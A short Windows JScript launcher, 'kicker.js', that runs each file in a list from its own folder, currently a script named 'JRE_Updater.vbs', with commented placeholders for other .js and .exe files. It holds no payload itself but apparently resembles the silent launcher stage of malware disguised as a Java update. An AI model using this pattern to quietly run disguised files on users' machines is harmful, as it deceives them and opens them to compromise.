// FileName: kicker.js

var scripts = [
    "JRE_Updater.vbs",
//    "xxxxx.js",
//    "xxxxx.exe",
];


var shell = new ActiveXObject("WScript.Shell");
var baseFolder = shell.CurrentDirectory;

var fs = new ActiveXObject("Scripting.FileSystemObject");
for ( var i = 0; i < scripts.length; i++ ) {
    var file = baseFolder + "\\" + scripts[i];
    if (fs.FileExists(file) == true) {
        var wsh = WScript.CreateObject ("WScript.Shell");
        wsh.Run(file);
        wsh = null;
    }
}
fs = null;

